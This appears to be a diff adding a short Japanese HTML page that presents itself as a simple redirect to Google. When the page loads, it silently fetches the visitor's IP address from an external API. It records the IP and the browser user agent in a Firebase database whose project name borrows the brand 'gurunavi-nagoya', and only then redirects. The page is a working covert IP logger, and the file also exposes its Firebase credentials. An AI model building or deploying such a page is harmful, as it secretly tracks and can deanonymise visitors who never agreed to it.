@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Redirect</title>
+</head>
+<body>
+  <script type="module">
+    // Firebase SDKのインポート
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
+    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-database.js";
+
+    // Firebaseの設定
+    const firebaseConfig = {
+      apiKey: "AIzaSyA5jiMfUjtZo7BUpsFM0xUVzfeJ5_fakkI",
+      authDomain: "gurunavi-nagoya.firebaseapp.com",
+      databaseURL: "https://gurunavi-nagoya-default-rtdb.firebaseio.com",
+      projectId: "gurunavi-nagoya",
+      storageBucket: "gurunavi-nagoya.firebasestorage.app",
+      messagingSenderId: "181576688818",
+      appId: "1:181576688818:web:f82fb20a8d58ef46c615ab"
+    };
+
+    // Firebaseの初期化
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    // アクセス情報の取得と送信
+    async function sendAccessInfo() {
+      try {
+        // IPアドレスを取得（外部APIを使用）
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const ip = ipData.ip;
+
+        // 端末情報（User-Agent）を取得
+        const userAgent = navigator.userAgent;
+
+        // タイムスタンプ
+        const timestamp = new Date().toISOString();
+
+        // Firebaseにデータを送信
+        const accessRef = ref(db, 'access_logs');
+        await push(accessRef, {
+          ip: ip,
+          userAgent: userAgent,
+          timestamp: timestamp
+        });
+
+        // Googleにリダイレクト
+        window.location.href = "https://www.google.com";
+      } catch (error) {
+        console.error("Error:", error);
+        // エラー時もGoogleにリダイレクト
+        window.location.href = "https://www.google.com";
+      }
+    }
+
+    // ページ読み込み時に実行
+    sendAccessInfo();
+  </script>
+</body>
+</html>
